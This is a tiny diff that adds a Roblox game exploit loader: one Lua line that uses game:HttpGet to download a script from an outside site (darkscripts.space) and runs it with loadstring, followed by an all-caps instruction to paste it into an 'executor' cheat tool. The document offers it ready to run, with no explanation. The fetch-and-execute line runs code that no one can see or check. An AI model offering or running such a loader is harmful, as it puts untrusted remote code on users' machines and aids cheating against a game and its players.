@@ -1,0 +1,4 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/7e29b756-ebbb-477a-91f5-3c7666121483_1270390615775117355.lua',true))()
+
+
+COPY THE WHOLE SCRIPT AND EXECUTE IN A EXECUTOR 
